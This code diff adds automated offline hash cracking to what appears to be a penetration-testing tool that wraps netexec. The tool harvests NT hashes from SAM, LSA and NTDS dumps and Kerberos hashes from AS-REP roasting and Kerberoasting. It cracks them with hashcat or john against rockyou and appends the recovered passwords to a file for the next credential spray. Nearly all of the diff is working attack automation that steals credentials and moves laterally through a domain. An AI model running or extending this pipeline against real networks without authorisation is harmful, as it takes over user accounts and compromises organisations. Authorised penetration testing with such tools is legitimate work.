@@ -88,6 +88,35 @@ CACHE_DEFAULT_TTL = 86400  # 24h
 CACHE_DEFAULT_PATH = Path.home() / ".cache" / "netexec-automator" / "state.db"
 NMAP_TIMEOUT = 180
 BLOODHOUND_TIMEOUT = 600
+CRACK_DEFAULT_TIMEOUT = 600  # 10 min per hash-type attack
+
+# Hashcat modes for the hash types we can produce.
+HASH_TYPES: dict[str, dict] = {
+    "nt":    {"hashcat_mode": "1000", "john_format": "nt",       "label": "NT (SAM/LSA/NTDS)"},
+    "asrep": {"hashcat_mode": "18200", "john_format": "krb5asrep", "label": "Kerberos AS-REP"},
+    "tgs":   {"hashcat_mode": "13100", "john_format": "krb5tgs",   "label": "Kerberos TGS-REP"},
+}
+
+# Where to look for a default wordlist (rockyou-style). First hit wins.
+# Both decompressed and .gz forms are supported (auto-decompressed on first use).
+WORDLIST_DEFAULT_PATHS: list[str] = [
+    "/usr/share/wordlists/rockyou.txt",
+    "/usr/share/wordlists/rockyou.txt.gz",
+    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
+    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz",
+    str(Path.home() / "wordlists" / "rockyou.txt"),
+    str(Path.home() / ".local" / "share" / "wordlists" / "rockyou.txt"),
+]
+ROCKYOU_DOWNLOAD_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
+
+# Hashcat / john potfile line: '<hash>:<plaintext>'. The hash itself may
+# contain colons (Kerberos hashes do), so we always split on the LAST colon.
+# For NT we additionally validate the left side is 32 hex.
+
+# Extract username embedded in Kerberos hashes for auto-grow.
+KRB_AS_REP_USER_RE = re.compile(r"\$krb5asrep\$\d+\$([^@\$]+)@", re.IGNORECASE)
+# Kerberoasting hash format: $krb5tgs$23$*user$DOMAIN$spn*$encrypted_data
+KRB_TGS_REP_USER_RE = re.compile(r"\$krb5tgs\$\d+\$\*([^\$]+)\$", re.IGNORECASE)
 
 # Profile presets — applied when the corresponding flag is given.
 # 'low-power' is intended for VMs / weak hosts: minimal parallelism, longer
@@ -498,6 +527,185 @@ class BloodHoundRunner:
         return success, out_dir, last_err
 
 
+class HashCracker:
+    """Wraps hashcat (preferred) or john for offline cracking of harvested hashes.
+
+    Designed to be opt-in (`--crack`) and incremental: each hash type produced
+    by the spray (NT from SAM/LSA/NTDS, AS-REP from --asreproast, TGS from
+    --kerberoasting) goes into a separate attack, persisted in a shared
+    potfile under loot/cracked/. Newly cracked plaintexts are returned to the
+    caller so they can be auto-appended to the grow-combo file."""
+
+    def __init__(
+        self,
+        loot: "LootStore",
+        wordlist: str | None = None,
+        cracker: str = "auto",
+        rules: str | None = None,
+        timeout: int = CRACK_DEFAULT_TIMEOUT,
+        log_cmd=None,
+    ):
+        self.loot = loot
+        self.wordlist_arg = wordlist
+        self.cracker_pref = cracker
+        self.rules = rules
+        self.timeout = timeout
+        self.log_cmd = log_cmd
+        self._wordlist_path: Path | None = None  # resolved lazily
+        self._cracker: str | None = None         # resolved lazily
+
+    # ---- discovery ----
+
+    @staticmethod
+    def detect_cracker(pref: str = "auto") -> str | None:
+        """Return 'hashcat' or 'john' if available; honors pref when possible."""
+        order = (
+            ["hashcat", "john"] if pref == "auto"
+            else [pref]
+        )
+        for tool in order:
+            if shutil.which(tool):
+                return tool
+        return None
+
+    def cracker(self) -> str | None:
+        if self._cracker is None:
+            self._cracker = self.detect_cracker(self.cracker_pref)
+        return self._cracker
+
+    def find_wordlist(self) -> Path | None:
+        """Locate a usable wordlist. If a .gz is found, decompress to a
+        sibling .txt and return that path."""
+        if self._wordlist_path is not None:
+            return self._wordlist_path
+        candidates = [self.wordlist_arg] if self.wordlist_arg else WORDLIST_DEFAULT_PATHS
+        for cand in candidates:
+            if not cand:
+                continue
+            p = Path(cand).expanduser()
+            if not p.exists():
+                continue
+            if p.suffix == ".gz":
+                decompressed = p.with_suffix("")  # strip .gz
+                if not decompressed.exists():
+                    try:
+                        import gzip
+                        with gzip.open(p, "rb") as src, open(decompressed, "wb") as dst:
+                            shutil.copyfileobj(src, dst)
+                    except OSError:
+                        continue
+                self._wordlist_path = decompressed
+            else:
+                self._wordlist_path = p
+            return self._wordlist_path
+        return None
+
+    # ---- attack ----
+
+    def cracked_dir(self) -> Path:
+        return self.loot.dir_for("cracked")
+
+    def build_cmd(self, hash_type: str, hash_file: Path, wordlist: Path) -> list[str]:
+        info = HASH_TYPES[hash_type]
+        # Honour an explicit --cracker preference even if the binary isn't in
+        # PATH; actual crack() will fail gracefully if it isn't there.
+        if self.cracker_pref in ("hashcat", "john"):
+            cracker = self.cracker_pref
+        else:
+            cracker = self.cracker() or "hashcat"
+        out_dir = self.cracked_dir()
+        if cracker == "hashcat":
+            cmd = [
+                "hashcat",
+                "-m", info["hashcat_mode"],
+                "-a", "0",
+                "--quiet",
+                "--potfile-path", str(out_dir / "potfile"),
+                "--outfile", str(out_dir / f"cracked-{hash_type}.txt"),
+                str(hash_file), str(wordlist),
+            ]
+            if self.rules:
+                cmd.extend(["-r", self.rules])
+        else:
+            # john --wordlist=... --format=<fmt> hash_file
+            cmd = [
+                "john",
+                f"--wordlist={wordlist}",
+                f"--format={info['john_format']}",
+                str(hash_file),
+            ]
+        return cmd
+
+    def crack(self, hash_type: str, hash_file: Path) -> tuple[bool, list[tuple[str, str]]]:
+        """Run the cracker for one hash file. Returns (success, [(hash,plain)…])."""
+        cracker = self.cracker()
+        if not cracker:
+            return False, []
+        wordlist = self.find_wordlist()
+        if not wordlist:
+            return False, []
+        if not hash_file.exists() or hash_file.stat().st_size == 0:
+            return False, []
+
+        cmd = self.build_cmd(hash_type, hash_file, wordlist)
+        if self.log_cmd:
+            self.log_cmd(f"crack {hash_type}", cmd, str(hash_file))
+
+        try:
+            subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
+        except subprocess.TimeoutExpired:
+            pass  # collect whatever the potfile already has
+
+        cracked = self._collect_results(cracker, hash_type, hash_file)
+        return True, cracked
+
+    def _collect_results(self, cracker: str, hash_type: str, hash_file: Path) -> list[tuple[str, str]]:
+        """Read potfile / john.pot to extract (hash, plaintext) pairs."""
+        pairs: list[tuple[str, str]] = []
+        if cracker == "hashcat":
+            pot = self.cracked_dir() / "potfile"
+            if pot.exists():
+                pairs = self._parse_potfile(pot.read_text(errors="replace"))
+        else:
+            # john --show prints 'user:password' to stdout
+            try:
+                shown = subprocess.run(
+                    ["john", "--show", f"--format={HASH_TYPES[hash_type]['john_format']}", str(hash_file)],
+                    capture_output=True, text=True, timeout=30,
+                )
+                for line in shown.stdout.splitlines():
+                    if ":" in line and not line.startswith(("0 password", "Loaded ")):
+                        h, _, p = line.rpartition(":")
+                        if h and p:
+                            pairs.append((h, p))
+            except (FileNotFoundError, subprocess.TimeoutExpired):
+                pass
+        # Keep only pairs whose hash is plausibly related to this attack
+        return [(h, p) for h, p in pairs if self._belongs_to(h, hash_type)]
+
+    @staticmethod
+    def _belongs_to(hash_str: str, hash_type: str) -> bool:
+        if hash_type == "nt":
+            return bool(HASH_NT_PATTERN.match(hash_str))
+        if hash_type == "asrep":
+            return "$krb5asrep$" in hash_str.lower()
+        if hash_type == "tgs":
+            return "$krb5tgs$" in hash_str.lower()
+        return True
+
+    @staticmethod
+    def _parse_potfile(text: str) -> list[tuple[str, str]]:
+        out: list[tuple[str, str]] = []
+        for line in text.splitlines():
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            h, _, p = line.rpartition(":")
+            if h and p:
+                out.append((h, p))
+        return out
+
+
 class NxcAutomator:
     """Run nxc across all protocols with combination or linear credential pairing."""
 
@@ -539,6 +747,11 @@ class NxcAutomator:
         grow_combo: str | None = None,
         export_json: str | None = None,
         export_csv: str | None = None,
+        crack_enabled: bool = False,
+        wordlist: str | None = None,
+        cracker: str = "auto",
+        crack_rules: str | None = None,
+        crack_timeout: int = CRACK_DEFAULT_TIMEOUT,
     ):
         self.targets = self._read_value_or_file(target)
         self.mode = mode.lower()
@@ -607,6 +820,15 @@ class NxcAutomator:
         self.grow_combo_path = Path(grow_combo) if grow_combo else None
         self.export_json_path = Path(export_json) if export_json else None
         self.export_csv_path = Path(export_csv) if export_csv else None
+
+        self.crack_enabled = crack_enabled
+        self.cracker = (
+            HashCracker(self.loot, wordlist=wordlist, cracker=cracker,
+                        rules=crack_rules, timeout=crack_timeout,
+                        log_cmd=self._log_command)
+            if crack_enabled else None
+        )
+        self.cracked_creds: list[dict] = []  # post-crack (user, plain) records
 
         # Cross-host state populated during the run.
         self.valid_creds: list[dict] = []
@@ -1100,6 +1322,8 @@ class NxcAutomator:
             parts.append(f"modules={','.join(self.modules)}")
         if self.secretsdump:
             parts.append("secretsdump")
+        if self.crack_enabled:
+            parts.append("crack")
         if self.bloodhound_enabled:
             parts.append("bloodhound")
         return " · ".join(parts) if parts else "—"
@@ -1139,6 +1363,12 @@ class NxcAutomator:
             filters.append("stop-on-success")
         if filters:
             print(f"  Filters         {DIM}│{RESET} {BOLD}{' · '.join(filters)}{RESET}")
+        if self.crack_enabled and self.cracker:
+            wl = self.cracker.find_wordlist()
+            wl_str = _truncate_path(wl) if wl else "missing"
+            print(f"  Cracking        {DIM}│{RESET} {BOLD}{self.cracker.cracker() or '?'} · wordlist={wl_str}"
+                  + (f" · rules={Path(self.cracker.rules).name}" if self.cracker.rules else "")
+                  + f"{RESET}")
         if self.scan_only:
             print(f"  {YELLOW}{BOLD}⚠ scan-only mode — no auth attempts will run{RESET}")
         else:
@@ -1458,7 +1688,8 @@ class NxcAutomator:
 
     def _harvest_smb_hashes(self, host: str, source: str, out: Path):
         """Parse SAM/LSA/NTDS output for user:rid:lm:nt::: lines and append
-        as 'user:lm:nt' to the combo-grow file."""
+        as 'user:lm:nt' to the combo-grow file. If --crack is on, fire
+        hashcat on the freshly-collected NT hashes."""
         try:
             text = out.read_text(errors="replace")
         except OSError:
@@ -1474,11 +1705,48 @@ class NxcAutomator:
             seen += 1
         if seen:
             self._append_grow_combo(self.harvested_hashes[-seen:])
-            print(f"    {GREEN}🧪 +{seen} hash(es) → {self._effective_grow_combo()}{RESET}")
+            print(f"    {GREEN}🧪 +{seen} hash(es) → {_truncate_path(self._effective_grow_combo())}{RESET}")
+            if self.crack_enabled and self.cracker:
+                self._crack_nt_hashes()
+
+    def _crack_nt_hashes(self):
+        """Write every harvested NT hash to a single file and crack it.
+        Hashcat with the same potfile picks up new hashes incrementally."""
+        nt_hashes = sorted({h["nt"] for h in self.harvested_hashes if h.get("nt")})
+        if not nt_hashes:
+            return
+        cracked_dir = self.cracker.cracked_dir()
+        hash_file = cracked_dir / "nt-hashes.txt"
+        hash_file.write_text("\n".join(nt_hashes) + "\n")
+        wl = self.cracker.find_wordlist()
+        print(f"    {CYAN}🔓 cracking {len(nt_hashes)} NT hash(es) with {_truncate_path(wl)}…{RESET}")
+        ok, pairs = self.cracker.crack("nt", hash_file)
+        if not ok:
+            print(f"    {RED}✘ cracking failed (check {hash_file}){RESET}")
+            return
+        nt_to_user = {h["nt"].lower(): h["user"] for h in self.harvested_hashes if h.get("nt")}
+        appended = 0
+        for hash_str, plain in pairs:
+            user = nt_to_user.get(hash_str.lower())
+            if not user:
+                continue
+            entry = {"user": user, "password": plain, "source": "nt-crack"}
+            if entry in self.cracked_creds:
+                continue
+            self.cracked_creds.append(entry)
+            appended += 1
+        if appended:
+            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
+            print(f"    {GREEN}{BOLD}🔓 cracked {appended}/{len(nt_hashes)} → appended to {_truncate_path(self._effective_grow_combo())}{RESET}")
+            for e in self.cracked_creds[-appended:]:
+                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
+        else:
+            print(f"    {DIM}0/{len(nt_hashes)} cracked — try --crack-rules best64 or a bigger wordlist{RESET}")
 
     def _harvest_kerberos_hashes(self, host: str, source: str, out: Path):
         """asreproast/kerberoasting output is already in hashcat-ready format
-        (e.g. $krb5asrep$23$user@DOMAIN: ...). We just note the file location."""
+        (e.g. $krb5asrep$23$user@DOMAIN: ...). If --crack is on, fire hashcat
+        on the file directly with the right -m mode."""
         try:
             text = out.read_text(errors="replace")
         except OSError:
@@ -1488,6 +1756,44 @@ class NxcAutomator:
         if n:
             print(f"    {GREEN}🧪 +{n} {source} hash(es) ready for hashcat{RESET}")
             self.harvested_hashes.append({"host": host, "source": source, "user": None, "lm": None, "nt": None, "kerberos_file": str(out), "count": n})
+            if self.crack_enabled and self.cracker:
+                self._crack_kerberos_hashes(out, source)
+
+    def _crack_kerberos_hashes(self, hash_file: Path, source: str):
+        """Run hashcat against an ASREProast (-m 18200) or Kerberoasting (-m 13100) file."""
+        hash_type = "asrep" if source == "asreproast" else "tgs"
+        user_re = KRB_AS_REP_USER_RE if hash_type == "asrep" else KRB_TGS_REP_USER_RE
+        wl = self.cracker.find_wordlist()
+        print(f"    {CYAN}🔓 cracking {source} with {_truncate_path(wl)}…{RESET}")
+        ok, pairs = self.cracker.crack(hash_type, hash_file)
+        if not ok:
+            print(f"    {RED}✘ cracking failed (check {hash_file}){RESET}")
+            return
+        appended = 0
+        for hash_str, plain in pairs:
+            m = user_re.search(hash_str)
+            user = m.group(1) if m else f"krb-{hash_type}"
+            entry = {"user": user, "password": plain, "source": f"{source}-crack"}
+            if entry in self.cracked_creds:
+                continue
+            self.cracked_creds.append(entry)
+            appended += 1
+        if appended:
+            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
+            print(f"    {GREEN}{BOLD}🔓 cracked {appended} {source} hash(es) → appended to {_truncate_path(self._effective_grow_combo())}{RESET}")
+            for e in self.cracked_creds[-appended:]:
+                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
+        else:
+            print(f"    {DIM}0 cracked from {source}{RESET}")
+
+    def _append_plain_creds_to_grow_combo(self, entries: list[dict]):
+        """Append plaintext (user, password) pairs to the grow-combo file —
+        same format that --combo accepts on the next run."""
+        path = self._effective_grow_combo()
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with open(path, "a") as fh:
+            for e in entries:
+                fh.write(f"{e['user']}:{e['password']}\n")
 
     def _effective_grow_combo(self) -> Path:
         return self.grow_combo_path or (self.loot.root / "auto-grown-creds.txt")
@@ -1732,6 +2038,24 @@ class NxcAutomator:
             self.bloodhound_runner = None
             self.bloodhound_enabled = False
 
+        if self.cracker and self.crack_enabled:
+            chosen = self.cracker.cracker()
+            wl = self.cracker.find_wordlist()
+            if not chosen:
+                print(f"  {YELLOW}{BOLD}⚠ neither hashcat nor john found in PATH — disabling --crack{RESET}\n")
+                self.crack_enabled = False
+                self.cracker = None
+            elif not wl:
+                print(
+                    f"  {YELLOW}{BOLD}⚠ wordlist not found — disabling --crack.{RESET}\n"
+                    f"  {DIM}Looked in:{RESET}\n"
+                    + "".join(f"    {DIM}- {p}{RESET}\n" for p in WORDLIST_DEFAULT_PATHS)
+                    + f"  {DIM}Pass --wordlist /path/to/file or download rockyou:{RESET}\n"
+                    f"    {DIM}wget -O ~/wordlists/rockyou.txt {ROCKYOU_DOWNLOAD_URL}{RESET}\n"
+                )
+                self.crack_enabled = False
+                self.cracker = None
+
         if self.verbosity > V_QUIET:
             self._print_scan_banner(total_attempts)
 
@@ -1827,6 +2151,7 @@ class NxcAutomator:
                     for dom, hs in self.domain_hosts.items()
                 ],
                 "harvested_hashes": self.harvested_hashes,
+                "cracked_credentials": self.cracked_creds,
                 "lockout_warnings": self.lockout_warnings,
             }
             self.export_json_path.parent.mkdir(parents=True, exist_ok=True)
@@ -2001,6 +2326,26 @@ def _build_parser():
                         help="Where to append harvested hashes (default: <loot-dir>/auto-grown-creds.txt). "
                              "Use this same file as --combo in the next run to spray the new creds.")
 
+    # ----- Cracking -----
+    g_crack = parser.add_argument_group(
+        "hash cracking",
+        "Offline cracking of NT (SAM/LSA/NTDS) and Kerberos (AS-REP/TGS-REP) hashes. "
+        "Cracked plaintexts are auto-appended to the grow-combo file in 'user:password' "
+        "form, so the next run can spray them."
+    )
+    g_crack.add_argument("--crack", action="store_true",
+                         help="Auto-crack harvested hashes with hashcat (or john) after --secretsdump "
+                              "and after LDAP --asreproast/--kerberoasting.")
+    g_crack.add_argument("--wordlist",
+                         help="Wordlist path. Default: auto-discover rockyou under /usr/share/wordlists/ etc. "
+                              "Falls back to the SecLists location, then ~/wordlists/.")
+    g_crack.add_argument("--cracker", choices=["hashcat", "john", "auto"], default="auto",
+                         help="Which cracker to use (default: auto = hashcat if present, else john).")
+    g_crack.add_argument("--crack-rules",
+                         help="Hashcat rules file (e.g. /usr/share/hashcat/rules/best64.rule).")
+    g_crack.add_argument("--crack-timeout", type=int, default=CRACK_DEFAULT_TIMEOUT,
+                         help=f"Per-attack timeout in seconds (default: {CRACK_DEFAULT_TIMEOUT}).")
+
     # ----- Export -----
     g_export = parser.add_argument_group("export")
     g_export.add_argument("--export-json",
@@ -2146,6 +2491,11 @@ def main():
             grow_combo=args.grow_combo,
             export_json=args.export_json,
             export_csv=args.export_csv,
+            crack_enabled=args.crack,
+            wordlist=args.wordlist,
+            cracker=args.cracker,
+            crack_rules=args.crack_rules,
+            crack_timeout=args.crack_timeout,
         )
         runner.run()
     except ValueError as exc:
